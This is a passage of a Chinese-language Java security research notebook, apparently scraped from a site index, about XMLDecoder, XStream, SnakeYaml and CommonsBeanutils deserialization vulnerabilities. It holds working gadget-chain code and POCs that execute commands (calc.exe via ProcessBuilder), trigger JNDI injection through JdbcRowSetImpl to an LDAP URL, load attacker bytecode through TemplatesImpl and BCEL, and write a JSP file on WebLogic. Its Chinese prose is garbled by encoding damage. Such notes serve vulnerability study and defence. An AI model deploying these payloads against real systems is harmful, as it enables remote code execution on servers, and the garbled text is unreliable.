java.util.PriorityQueue; public class CommonsBeanutils2_PropertySource { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); AttrNSImpl attrNS1 = new AttrNSImpl(); CoreDocumentImpl coreDocument = new CoreDocumentImpl(); attrNS1.setValues(coreDocument, \"1\", \"1\", \"1\"); /**ä½¿ç”¨PropertySource.Comparatorç±»*/ final PropertySource propertySource = new PropertySource() { public int getPriority() { return 0; } }; final BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(propertySource);priorityQueue.add(propertySource); /**æ¢ç”¨ç»§æ‰¿ä¼šè§¦å‘ä¸€äº›é¡ºåºä¸Šçš„é—®é¢˜*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } } "},"javanote/Java XMLååºåˆ—åŒ–æ¼æ´.html":{"url":"javanote/Java XMLååºåˆ—åŒ–æ¼æ´.html","title":"Java XMLååºåˆ—åŒ–æ¼æ´","keywords":"","body":"Java XMLååºåˆ—åŒ–æ¼æ´ ä¾‹ä¸¾å‡ºå‡ ä¸ªå‡ ä¸ª XML å’Œ YAML çš„ååºåˆ—åŒ–æ¼æ´ã€‚ XMLDecoder XStream SnakeYaml åœ¨æˆ‘é‡åˆ°çš„é¡¹ç›®é‡Œï¼Œè¿™ä¸‰ä¸ªä¾èµ–åº“æœ€å¸¸è§ã€‚ å…¶ä¸­ XMLDecoder ä¸åŒäºå…¶ä»–å‡ ä¸ªï¼Œè¿™ä¸ªæ›´åƒæ˜¯åå°„æ¼æ´ï¼Œè™½ç„¶æœ¬è´¨ä¸Šéƒ½æ˜¯å¯ä»¥ååºåˆ—åŒ–å›åºåˆ—åŒ–çš„æ•°æ®ï¼Œä½† XMLDecoder å’Œ XStream å¯ä»¥è‡ªç”±çš„æ§åˆ¶ç±»ã€æ–¹æ³•ã€å‚æ•°ï¼ŒSnakeYaml ä¸€ç±»å°±åŒ Jackson å’Œ fastjson ä¸€æ ·ï¼Œæœ¬è´¨ä¸Šæ˜¯è°ƒç”¨äº† getã€set å’Œæ„é€ æ–¹æ³•ã€‚ weblogic debug Reference: https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html https://blog.csdn.net/Munch_D_Rudy/article/details/122459667 debugç‚¹åœ¨test\\weblogic.jar!\\weblogic\\wsee\\jaxws\\WLSServletAdapter.class:129 æœ€åè®¿é—®è¯¥ç½‘å€æµ‹è¯•æ˜¯å¦debug http://localhost:7001/wls-wsat/CoordinatorPortType XMLDecoder Encode import java.beans.XMLEncoder; import java.util.ArrayList; import java.util.HashMap; public class Encode { public static void main(String[] args){ HashMap map = new HashMap<>(); map.put(\"123\", \"hhh\"); map.put(\"321\", new ArrayList<>()); XMLEncoder xmlEncoder = new XMLEncoder(System.out); xmlEncoder.writeObject(map); xmlEncoder.close(); } } ä¼šå¾—åˆ°ä¸€æ®µç”¨ XMLEncoder ç”Ÿæˆ hashmap å¯¹è±¡ xml çš„ä»£ç  123 hhh 321 å†æ‹¿è¿™ä¸ªç”Ÿæˆçš„xmlï¼Œç”¨XMLDecoderè§£æ import java.beans.XMLDecoder; import java.beans.XMLEncoder; import java.io.StringBufferInputStream; import java.util.ArrayList; import java.util.HashMap; public class Decode { public static void main(String[] args){ String s = \"\\n\" + \"\\n\" + \" \\n\" + \" \\n\" + \" 123\\n\" + \" hhh\\n\" + \" \\n\" + \" \\n\" + \" 321\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \"\"; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s); XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream); Object o = xmlDecoder.readObject(); System.out.println(o); } } æˆåŠŸæŠŠåˆšæ‰çš„mapå¯¹è±¡ç»™ååºåˆ—åŒ–å›æ¥äº† {123=hhh, 321=[]} å¯ä»¥æ ¹æ®å…¶å†™æ³•å»æ‰§è¡Œä»£ç  calc.exe ç›¸å½“äºæ‰§è¡Œäº† new java.lang.ProcessBuilder(new String[]{\"calc\"}).start(); ç„¶åå¯ä»¥æ ¹æ®weblogic XMLDecoderçš„ä¸€äº›payloadæ¨æ–­æ‰§è¡Œçš„ä»£ç  /usr/local/tomcat/webapps/ROOT/static/ricky.jsp ç›¸å½“äºæ‰§è¡Œäº† java.io.PrintWriter x = new java.io.PrintWriter(\"/usr/local/tomcat/webapps/ROOT/static/ricky.jsp\"); x.println(\"ricky\"); x.close(); æµç¨‹åˆ†æ æ•´ä½“æµç¨‹ XMLDecoder.readObject() XMLDecoder.parsingCompelete() DocumentHandler.parse() SAXParserFactory.newInstance().newSAXParser().parse() xmlReader.parse() XMLDecoderç±»è§£æXMLæ˜¯è°ƒç”¨DocumentHandlerç±»å®ç°çš„ï¼Œè€ŒDocumentHandlerç±»æ˜¯åŸºäºSAXParserç±»å¯¹XMLçš„è§£æä¸Šçš„, DocumentHandlerç±»æ˜¯XMLDecoderååºåˆ—åŒ–æ¼æ´çš„æ ¹æºç±» é€šè¿‡readObjectè¿›å…¥parsingComplete private boolean parsingComplete() { if (this.input == null) { return false; } if (this.array == null) { if ((this.acc == null) && (null != System.getSecurityManager())) { throw new SecurityException(\"AccessControlContext is not set\"); } AccessController.doPrivileged(new PrivilegedAction() { public Void run() { XMLDecoder.this.handler.parse(XMLDecoder.this.input); return null; } }, this.acc); this.array = this.handler.getObjects(); } return true; } æ¥ç€è°ƒç”¨XMLDecoder.this.handler.parseæ–¹æ³•, é»˜è®¤çš„handler private final DocumentHandler handler = new DocumentHandler(); äºæ˜¯è·Ÿè¿›DocumentHandler#parse public void parse(final InputSource var1) { if (this.acc == null && null != System.getSecurityManager()) { throw new SecurityException(\"AccessControlContext is not set\"); } else { AccessControlContext var2 = AccessController.getContext(); SharedSecrets.getJavaSecurityAccess().doIntersectionPrivilege(new PrivilegedAction() { public Void run() { try { SAXParserFactory.newInstance().newSAXParser().parse(var1, DocumentHandler.this); } catch (ParserConfigurationException var3) { DocumentHandler.this.handleException(var3); } catch (SAXException var4) { Object var2 = var4.getException(); if (var2 == null) { var2 = var4; } DocumentHandler.this.handleException((Exception)var2); } catch (IOException var5) { DocumentHandler.this.handleException(var5); } return null; } }, var2, this.acc); } } è·Ÿè¿› SAXParserFactory.newInstance().newSAXParser().parse, ä¸€å¼€å§‹æ˜¯é€šè¿‡ SAXParserFactory.newInstance() åˆ›å»ºäº†ä¸€ä¸ª SAXParserFactoryImpl å®ä¾‹, è°ƒç”¨å…¶ newSAXParser æ–¹æ³• public SAXParser newSAXParser() throws ParserConfigurationException { SAXParser saxParserImpl; try { saxParserImpl = new SAXParserImpl(this, features, fSecureProcess); } catch (SAXException se) { // Translate to ParserConfigurationException throw new ParserConfigurationException(se.getMessage()); } return saxParserImpl; } å¾ˆæ˜æ˜¾, è¿”å›çš„æ˜¯ä¸€ä¸ª SAXParserImpl å®ä¾‹, äºæ˜¯è·Ÿè¿› SAXParserImpl#parse public void parse(InputSource is, DefaultHandler dh) throws SAXException, IOException { if (is == null) { throw new IllegalArgumentException(); } if (dh != null) { xmlReader.setContentHandler(dh); xmlReader.setEntityResolver(dh); xmlReader.setErrorHandler(dh); xmlReader.setDTDHandler(dh); xmlReader.setDocumentHandler(null); } xmlReader.parse(is); } ç»§ç»­è·Ÿè¿› SAXParserImpl#parse public void parse(InputSource inputSource) throws SAXException, IOException { if (fSAXParser != null && fSAXParser.fSchemaValidator != null) { if (fSAXParser.fSchemaValidationManager != null) { fSAXParser.fSchemaValidationManager.reset(); fSAXParser.fUnparsedEntityHandler.reset(); } resetSchemaValidator(); } super.parse(inputSource); } è·Ÿè¿›AbstractSAXParser#parseåå†è·Ÿè¿›XMLParser#parse, ç„¶åå¾€ä¸‹èµ°ä¼šæ¥åˆ°XML11Configuration#parse public boolean parse(boolean complete) throws XNIException, IOException { // // reset and configure pipeline and set InputSource. if (fInputSource != null) { try { fValidationManager.reset(); fVersionDetector.reset(this); fConfigUpdated = true; resetCommon(); short version = fVersionDetector.determineDocVersion(fInputSource); if (version == Constants.XML_VERSION_1_1) { initXML11Components(); configureXML11Pipeline(); resetXML11(); } else { configurePipeline(); reset(); } // mark configuration as fixed fConfigUpdated = false; // resets and sets the pipeline. fVersionDetector.startDocumentParsing((XMLEntityHandler) fCurrentScanner, version); fInputSource = null; } catch (XNIException ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw ex; } catch (IOException ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw ex; } catch (RuntimeException ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw ex; } catch (Exception ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw new XNIException(ex); } } determineDocVersion()ä¸»è¦è·å–XMLå®ä½“æ‰«æå™¨ç„¶åæ‰«æè§£æ æ¥è·å–XMLæ–‡æ¡£çš„ç‰ˆæœ¬ä¿¡æ¯ è¿”å›ç‰ˆæœ¬ä¿¡æ¯åï¼Œç»§ç»­å¾€ä¸‹åœ¨XML11Configuration.parse()ä¸­è°ƒç”¨startDocumentParsing()å‡½æ•°ï¼Œä¸»è¦æ˜¯é‡ç½®æ‰«æå™¨çš„ç‰ˆæœ¬é…ç½®å¹¶å¼€å§‹æ–‡ä»¶æ‰«æå‡†å¤‡ï¼Œå…¶ä¸­å¼€å§‹æ–‡ä»¶æ‰«æå‡†å¤‡æ˜¯è°ƒç”¨startEntity()å‡½æ•°ï¼ˆè·Ÿè¸ªè¿›å»å¯ä»¥çœ‹åˆ°æ˜¯é€šçŸ¥æ‰«æå™¨å¼€å§‹å®ä½“æ‰«æï¼Œå…¶ä¸­æ–‡æ¡£å®ä½“çš„ä¼ªåç§°ä¸º\"[xml]\"ã€DTDçš„ä¼ªåç§°ä¸º\"[dtd]\"ã€å‚æ•°å®ä½“åç§°ä»¥\"%\"å¼€å¤´ï¼›æ¥ç€å‡½æ•°å†…éƒ¨ä¼šè°ƒç”¨startDocument()å‡½æ•°å¼€å§‹å‡†å¤‡æ–‡ä»¶æ‰«æï¼‰, æœ€åä¼šåˆ° ObjectElementHandler#getValueObject åˆ›å»ºå®ä¾‹ æœ€åè§£æåˆ°voidæ ‡ç­¾è·å–åˆ°startæ–¹æ³•ï¼Œç„¶åé€šè¿‡è°ƒç”¨startæ–¹æ³•å®ç°äº†å‘½ä»¤æ‰§è¡Œ XStream XStream å’Œ XMLDecoder å·®ä¸å¤šï¼Œéƒ½æ˜¯ Java å¯¹è±¡å’Œ XML äº’è½¬çš„åº“ï¼Œåœ¨å®¡è®¡javaé¡¹ç›®æ—¶ä¹Ÿç»å¸¸èƒ½è§åˆ°ã€‚æ¯”è¾ƒå‡ºåçš„å‡ ä¸ªé¡¹ç›® Bamboo ã€Struts2 ã€Jenkins éƒ½æœ‰ç”¨åˆ°å®ƒï¼Œä¸”æ›å‡ºè¿‡æ¼æ´ã€‚ XStream æœ‰å‡ ä¸ª CVE ï¼Œåˆ†åˆ«æ˜¯ RCEã€XXEã€DOSã€‚ XXE å½±å“ 1.4.8 åŠä¹‹å‰ç‰ˆæœ¬ com.thoughtworks.xstream.io.xml.DomDriver domDriver = new com.thoughtworks.xstream.io.xml.DomDriver(); String x = \"\\n\" + \"\\n\" + \"%xxe;]>\\n\" + \"1\"; domDriver.createReader(new StringReader(x)); æ¼æ´å‚è€ƒ http://x-stream.github.io/CVE-2016-3674.html DOS å½±å“ 1.4.9 åŠä¹‹å‰ç‰ˆæœ¬ XStream xstream = new XStream(); xstream.fromXML(\"\"); xstream.fromXML(\"Hello, world!\"); RCE å®ƒçš„ CVE ç¼–å·æ˜¯ CVE-2013-7285ï¼Œå¯ä»¥å½±å“åˆ° 1.4.10 ç‰ˆæœ¬ã€‚è¿˜æœ‰ CVE-2019-10173ã€‚ 1.4.10 ç‰ˆæœ¬æ›´æ–°çš„æ—¶å€™åŠ äº†ä¸€ä¸ªé€šè¿‡ XStream.setupDefaultSecurity æ–¹æ³•åˆå§‹åŒ–å®‰å…¨æ¡†æ¶çš„åŠŸèƒ½ã€‚ä½†é»˜è®¤ä¸è¢«è°ƒç”¨ï¼Œä¾ç„¶å¯ä»¥æ”»å‡» 1.4.10 ç‰ˆæœ¬çš„ XStreamã€‚ import com.thoughtworks.xstream.XStream; public class xstream { public static void main(String[] args) { XStream xstream = new XStream(); String x = \"\\n\" + \" \\n\" + \" java.lang.Comparable\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \" calc.exe\\n\" + \" \\n\" + \" \\n\" + \" start\\n\" + \" \\n\" + \" \\n\" + \"\"; xstream.fromXML(x); } } ååºåˆ—åŒ–åˆ©ç”¨å·¥å…· marshalsec é‡Œå°±å¯ä»¥ç”Ÿæˆ XStream çš„å¾ˆå¤š gadgets CommonsConfiguration Rome CommonsBeanutils ServiceLoader ImageIO BindingEnumeration LazySearchEnumeration SpringAbstractBeanFactoryPointcutAdvisor SpringPartiallyComparableAdvisorHolder Resin XBean å®ç°çš„è¿™äº›æ¥å£éƒ½æ˜¯å¯ä»¥ç”Ÿæˆçš„ gadgets Xstreamååºåˆ—åŒ– å‚è€ƒ: https://www.anquanke.com/post/id/204314 https://blog.szfszf.top/article/52/ https://blog.0kami.cn/2020/04/18/java/talk-about-xstream-deserialization/ XStreamçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸»è¦ä¾é toXMLå‡½æ•°å’ŒfromXMLå‡½æ•° å…³äºXStreamçš„fromXMLåˆ†æå‚è€ƒè¿™ç¯‡æ–‡ç«  XStreamååºåˆ—åŒ–å’Œfastjsonä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯fastjsonä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¸»åŠ¨å»è°ƒç”¨getterså’Œsettersï¼Œè€ŒXStreamçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­èµ‹å€¼éƒ½æœ‰Javaçš„åå°„æœºåˆ¶æ¥å®Œæˆï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰è¿™æ ·ä¸»åŠ¨è°ƒç”¨çš„ç‰¹æ€§ã€‚ MapConverter é’ˆå¯¹Mapç±»å‹è¿˜åŸçš„Converter com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal populateMapå‡½æ•°ä¼šå»å¤„ç†åç»­çš„å€¼ï¼Œç›´æ¥æ¥çœ‹å…·ä½“putçš„åœ°æ–¹ com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap è¿™é‡Œtargetä½œä¸ºæ¥æ”¶è€…ï¼Œä¼šè°ƒç”¨Mapçš„putå‡½æ•°ï¼Œåç»­å°±æ˜¯å¯¹keyè°ƒç”¨hashCodeå‡½æ•° TreeSet/TreeMapConverter è¿™é‡ŒTreeSetå’ŒTreeMapæ”¾ä¸€èµ·ï¼Œå› ä¸ºTreeSetæœ¬èº«å°±æ˜¯ä¸€ä¸ªåªç”¨ä¸Šäº†Keyçš„TreeMapï¼›TreeSetConverterçš„ååºåˆ—åŒ–å¤„ç†ä¹Ÿæ˜¯å…ˆè½¬åŒ–ä¸ºTreeMapConverterçš„æ–¹å¼æ¥ä¼˜å…ˆè¿˜åŸTreeSeté‡Œçš„TreeMapï¼Œå†å¡«å……åˆ°TreeSeté‡Œã€‚ ä»TreeSetConverterå¼€å§‹ ä»Treesetä¸­å–å‡ºfield treemapåï¼Œå»è¿›ä¸€æ­¥è°ƒç”¨TreeMapConverteræ¥è¿˜åŸTreeMap com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap è¿™é‡Œå…ˆç”¨soredMapæ¥å¡«å……éœ€è¦è¿˜åŸçš„Entryï¼Œåç»­å°†è°ƒç”¨TreeMap.putAll æœ€ç»ˆä¼šè°ƒç”¨åˆ°java.util.AbstractMap#putAll è¿™é‡Œçš„putå‡½æ•°ä¸ºTreeMap.put , å®ƒçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯å¡«å……æ•°æ®ï¼Œå¹¶ä¸”åœ¨å¡«å……æ—¶å°†ä¼šæ¯”è¾ƒå½“å‰å­˜åœ¨keyï¼Œå¦‚æœæ˜¯ç›¸åŒçš„keyï¼Œåˆ™æ›¿æ¢åŸæœ‰è€çš„å€¼ã€‚è¿™ä¸ªè¿‡ç¨‹ä¼šå»è°ƒç”¨keyçš„compareToå‡½æ•° DynamicProxyConverter XStreamè¿˜æ”¯æŒå¯¹åŠ¨æ€ä»£ç†çš„æ–¹å¼è¿›è¡Œè¿˜åŸ ä¸»è¦çš„å…³æ³¨ç‚¹æ˜¯ä½¿ç”¨ProxyåŠ¨æ€ä»£ç†, å¯ä»¥æ‰©å±•å‰é¢ä¸¤ç§çš„è‡ªåŠ¨è°ƒç”¨å‡½æ•°çš„æ”»å‡»é¢ ç»“åˆä¸Šé¢åŸºç¡€çŸ¥è¯†ä¸­æåˆ°çš„å‡ ä¸ªConverterï¼Œæˆ‘ä»¬æƒ³è¦åˆ©ç”¨XStreamååºåˆ—åŒ–æ¼æ´çš„è¯ï¼Œå¾—å»å……åˆ†åˆ©ç”¨å‰é¢æåˆ°çš„å‡ ä¸ªä¼šè‡ªåŠ¨è°ƒç”¨çš„å‡½æ•° EventHandler XStreamååºåˆ—åŒ–ç”¨çš„æœ€å¤šçš„EventHandlerï¼Œæ¥çœ‹çœ‹å®ƒçš„invokeå‡½æ•° é¦–å…ˆéœ€è¦åˆ¤æ–­æ­¤æ—¶è°ƒç”¨çš„å‡½æ•°æ˜¯å¦ä¸ºhashCodeã€equalsã€toStringï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œé‡‡ç”¨ä»¥ä¸‹çš„æ–¹å¼æ¥å¤„ç†ã€‚ if (methodName.equals(\"hashCode\")) { return new Integer(System.identityHashCode(proxy)); } else if (methodName.equals(\"equals\")) { return (proxy == arguments[0] ? Boolean.TRUE : Boolean.FALSE); } else if (methodName.equals(\"toString\")) { return proxy.getClass().getName() + '@' + Integer.toHexString(proxy.hashCode()); } éœ€è¦åˆ©ç”¨çš„æ˜¯invokeInternalå‡½æ•°åç»­çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨çš„æ—¶å€™ä¸èƒ½ç”¨å®ƒæ¥è°ƒç”¨ä¸Šé¢çš„3ä¸ªå‡½æ•°ï¼Œæ„å‘³ç€å‰é¢æåˆ°çš„Mapçš„æ–¹å¼ï¼Œä¸é€‚åˆç”¨åœ¨è¿™ä¸ªåœ°æ–¹ï¼›è€ŒTreeSetè¿™ç§è°ƒç”¨compareToå‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥ç»§ç»­å¾€ä¸‹èµ°ã€‚ åç»­çš„å°±æ˜¯javaåå°„æœºåˆ¶æ¥å®ç°å‡½æ•°è°ƒç”¨, å¹¶ä¸”è¿™é‡Œçš„targetå’Œactionéƒ½æ˜¯å¯æ§çš„ã€‚ æ­¤å¤„actionå‡½æ•°å‚æ•°æ˜¯æœ‰è¦æ±‚çš„: æ— å‚æ•° å•ä¸ªå‚æ•°ï¼Œä¸”å‚æ•°çš„ç±»å‹ä¸ºComparableï¼Œå¹¶ä¸”è¿™ä¸ªactionå‡½æ•°æ˜¯å¯åˆ©ç”¨çš„ ç¬¬2ç§æš‚æ—¶æœªå‡ºç°, å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ç§æ–¹æ³•: é…ç½®å¥½cmdçš„ProcessBuilderï¼Œactionå¡«start é…ç½®å¥½rmi urlçš„JdbcRowSetImplï¼Œactionå¡«getDatabaseMetaDataï¼Œä¸»è¦æ€è·¯å°±æ˜¯å¯åˆ©ç”¨çš„getters TreeSet POC1 java.lang.Comparable calc.exe start POC2 java.lang.Comparable ldap://127.0.0.1:1099/calc getDatabaseMetaData ä¹Ÿå°±æ˜¯æŠŠdataSourceåœ¨çˆ¶ç±»javax.sql.rowset.BaseRowSeté»˜è®¤èµ‹å€¼åè°ƒç”¨å­ç±»com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaDataè§¦å‘JNDIæ³¨å…¥, å®Œæ•´çš„å†™æ³•ä¼šæ¯”è¿™ä¸ªå¤æ‚, åŸå› æ˜¯æŠŠæ‰€æœ‰çš„é»˜è®¤å€¼éƒ½ç”Ÿæˆäº† POC3 java.lang.Comparable 1008 true 1000 0 2 0 0 0 true 1004 false ldap://127.0.0.1:1099/calc -1 -1 -1 -1 -1 -1 -1 -1 -1 -1 getDatabaseMetaData TreeMap POC4 java.lang.Comparable calc.exe false start ricky POC5 java.lang.Comparable ldap://127.0.0.1:1099/calc getDatabaseMetaData ricky Groovy ConvertedClosure åˆ©ç”¨ç¯å¢ƒï¼šgroovy MethodClosureä¸å…è®¸ååºåˆ—åŒ–è°ƒç”¨ MethodClosure å½“å‰MethodClosureçš„ä¸»è¦ä½œç”¨å°±æ˜¯å°è£…æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å¯¹è±¡ï¼Œæ¯”å¦‚ new MethodClosure(Runtime.getRuntime(), \"exec\"); å°è£…Runtimeå¯¹è±¡ï¼Œå¹¶è®¾å®šåç»­éœ€è¦è°ƒç”¨çš„å‡½æ•°exec ConvertedClosure è¿™ä¸ªConvertedClosureä¹Ÿæ˜¯ç»§æ‰¿äº†InvocationHandlerï¼Œå¯ä»¥åœ¨åŠ¨æ€ä»£ç†ä¸­ä½œä¸ºhandlerçš„å­˜åœ¨ï¼Œæ¥çœ‹ä¸€ä¸‹ä»–çš„invoke ConvertedClosure è°ƒç”¨çš„æ˜¯çˆ¶ç±»org.codehaus.groovy.runtime.ConversionHandler#invoke ä¸»è¦çœ‹è¿™ä¸ªéƒ¨åˆ†ï¼Œå¯¹äºå½“å‰è°ƒç”¨çš„å‡½æ•°ï¼Œå¦‚æœéObjectçš„å‡½æ•°(å¦‚toStringã€hashCodeç­‰)ï¼Œå¹¶ä¸”ä¸æ˜¯GroovyObjectçš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨å­ç±»çš„invokeCustomï¼Œè¿™é‡Œçœ‹org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom è¿™é‡Œçš„å±æ€§éƒ½æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å»è°ƒç”¨å»è°ƒç”¨å‰é¢æ„é€ å¥½çš„MethodClosure å‚è€ƒ: https://paper.seebug.org/1171/ compareToä¼šå¸¦ä¸Šä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬MethodClosureå°è£…çš„åç»­éœ€è¦è°ƒç”¨çš„å‡½æ•°å¿…é¡»è¦å­˜åœ¨ä¸€ä¸ªStringç±»å‹çš„å‚æ•°ï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°å‡½æ•°æŠ¥é”™, ç›´æ¥æ„é€ Runtime.execå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ calc java.lang.Comparable exec compareTo Groovy Expando è¿™é‡Œä½¿ç”¨Mapçš„ç±»å‹æ¥è§¦å‘ã€‚ä»¥Mapçš„ç±»å‹æ¥è§¦å‘ï¼Œé‚£å°±æ˜¯æ‰¾å¯ä»¥åˆ©ç”¨çš„hashCodeå‡½æ•° groovy.util.Expando#hashCode å¦‚æœåœ¨ç±»å±æ€§expandoPropertiesä¸­å­˜åœ¨hashCode:methodclosureçš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œç›´æ¥è°ƒç”¨MethodClosureçš„callå‡½æ•°ï¼Œè·Ÿä¸Šé¢ConvertedClosureåç»­çš„è°ƒç”¨ä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œè°ƒç”¨æ—¶æ²¡æœ‰å‡½æ•°å‚æ•°è¿‡æ¥ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ€è·¯æ˜¯ProcessBuilder.startæˆ–è€…fastjsoné‚£ç§gettersçš„åˆ©ç”¨ hashCode calc.exe false 0 0 0 start ricky groovy String execute() method (sample: \"calc.exe\".execute()) hashCode calc.exe calc.exe execute ImageIO$ContainsFilter(CVE-2020-26217) è¿™æ¡é“¾åˆ©ç”¨çš„ä¹Ÿæ˜¯HashMapè‡ªåŠ¨è°ƒç”¨hashCodeæ–¹æ³•çš„è§¦å‘ç‚¹ POC 0 false 0 calc.exe false java.lang.ProcessBuilder start foo foo false 0 0 false false 0 ServiceLoader$LazyIterator åœ¨java.util.ServiceLoader$LazyIteratorç±»çš„nextæ–¹æ³•ä¸­ä¼šè°ƒç”¨Class.forName, å…¶ä¸­ClassNameå’Œloaderéƒ½å¯æ§ï¼Œå¯ä»¥åˆ©ç”¨ä»¥å‰BCELçš„classLoaderä¼šæŠŠclassNameå†…å®¹å½“å­—èŠ‚ç åŠ è½½çš„gadgetå®ç°getshellã€‚ è™½ç„¶Class.forNameçš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºfalseæ— æ³•åŠ è½½ç±»çš„é™æ€å—ï¼Œä½†æ˜¯åœ¨åç»­å®ä¾‹åŒ–äº†è¿™ä¸ªç±»ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ— å‚æ„é€ å‡½æ•°é‡Œæ’å…¥æ¶æ„ä»£ç ã€‚ ä¿®æ”¹BCEL ClassLoaderæ„é€ POC è¿™é‡Œæ¥æä¸€ä¸‹å…³äºPOCçš„æ„é€ ï¼Œå¦‚æœä½ ä½¿ç”¨äº†å½“å‰è¿™ä¸ªåˆ©ç”¨é“¾ï¼Œå¹¶ä¸”ä¸å¯¹ClassLoaderåšå¤„ç†çš„è¯ï¼Œä½ ä¼šå‘ç°æ€ä¹ˆéƒ½æ‰“ä¸é€šï¼Œå› ä¸ºè¿™é‡Œåœ¨å®é™…è¿˜åŸClassLoaderçš„æ—¶å€™å‡ºç°äº†é”™è¯¯ è¿™é‡Œæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€æ˜¯å»é™¤è¿™ç§è¿˜åŸæœ‰é—®é¢˜çš„ç±»ï¼ˆä¼šå¾ˆéº»çƒ¦ï¼‰ï¼ŒäºŒæ˜¯ç›´æ¥æŠŠClassLoaderé‡Œçš„ä¸€äº›æ— å…³ç´§è¦çš„ä¸œè¥¿å‰”é™¤æ‰ã€‚ è¿™é‡Œæˆ‘é€‰æ‹©äº†ç¬¬äºŒç§ï¼Œç»è¿‡è°ƒè¯•å»é™¤äº†ä»¥ä¸‹å‡ ä¸ªå±æ€§çš„å€¼ è¿™é‡Œç”±äºæˆ‘ä»¬å‰”é™¤äº†ignored_packageså’ŒdeferToï¼Œå¯¼è‡´BCELçš„ClassLoaderåœ¨è½½å…¥æ™®é€šçš„ç±»çš„æ—¶å€™ä¼šå‡ºç°åŠ è½½é”™è¯¯çš„é—®é¢˜ æ¥çœ‹çœ‹æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜ é¦–å…ˆBCELçš„ClassLoader.loadClassï¼Œä¸€å…±å°è¯•4æ¬¡ä¸åŒçš„è½½å…¥æ–¹æ³• ä»å½“å‰ClassLoaderçš„classeså»æ‰¾ å¯¹äºé»˜è®¤å¿½ç•¥çš„åŒ…java./sun./javax.ï¼Œä½¿ç”¨deferToå»é‡æ–°åŠ è½½ï¼Œè¿™é‡Œçš„deferToæ˜¯ç³»ç»Ÿçš„ClassLoaderï¼ˆClassLoader.getSystemClassLoader()) å¯¹äºclassnameä»¥$$BCEL$$å¼€å¤´çš„ï¼Œæ ¹æ®classnameçš„å€¼å»defineClassï¼Œè¿™è¾¹å°±æ˜¯æˆ‘ä»¬æœ€å–œæ¬¢çš„ä»»æ„è½½å…¥å­—èŠ‚ç çš„åœ°æ–¹ æœ€åä¸€æ¬¡æ˜¯ç”¨repositoryå»è½½å…¥å½“å‰çš„classnameï¼Œå¦‚æœè¿™é‡Œè¿˜æ²¡æ‰¾åˆ°ï¼Œå°±ä¼šçˆ†æ²¡æœ‰æ‰¾åˆ°Classçš„é”™è¯¯ PSï¼šè¿™éƒ¨åˆ†repositoryå–çš„SyntheticRepository.getInstance()ï¼Œè¿˜ä¸æ˜¯å¾ˆæ¸…æ¥šè¿™ä¸ªå·¦å³ï¼Œåç»­æ•´ç†ä¸€ä¸‹ClassLoaderç›¸å…³çš„çŸ¥è¯†å†åšè¡¥å…… å†æ¥çœ‹æˆ‘ä»¬æŠ¥é”™çš„åŸå› ï¼Œå› ä¸ºåˆ é™¤ignored_packageså’ŒdeferToä¹‹åï¼Œç›¸å½“äºç¬¬äºŒç§æƒ…å†µæ— æ³•è½½å…¥äº†ï¼Œè€Œæ˜¾ç„¶java.lang.Objectä¸ç¬¦åˆç¬¬ä¸‰ç§æƒ…å†µã€‚æœ€åç¬¬4ç§é‡Œé¢ä¹Ÿæ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªjava.lang.Objectï¼Œæ‰€ä»¥æœ€ç»ˆçˆ†äº†ClassNotFoundException 